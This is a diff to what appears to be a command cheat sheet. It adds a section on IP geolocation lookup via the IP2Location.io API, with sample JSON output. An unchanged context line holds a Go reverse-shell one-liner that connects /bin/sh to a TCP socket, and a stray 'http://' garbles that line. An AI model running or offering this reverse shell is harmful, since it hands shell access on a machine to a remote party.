@@ -381,6 +381,30 @@ func main() {
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
 ```
 
+# Query IP geolocation information with IP2Location.io
+
+``` bash
+curl -s "https://api.ip2location.io/?ip=8.8.8.8&format=json" | jq
+```
+
+```json
+{
+    "ip": "8.8.8.8",
+    "country_code": "US",
+    "country_name": "United States of America",
+    "region_name": "California",
+    "city_name": "Mountain View",
+    "latitude": 37.38605,
+    "longitude": -122.08385,
+    "zip_code": "94035",
+    "time_zone": "-07:00",
+    "asn": "15169",
+    "as": "Google LLC",
+    "is_proxy": false,
+    "message": "Limit to 500 queries per day. Sign up for a Free plan at https://www.ip2location.io to get 30K queries per month."
+}
+```
+
 # Enumerating IPs with IPInfo
 
 ```curl ipinfo.io/54.90.107.240```
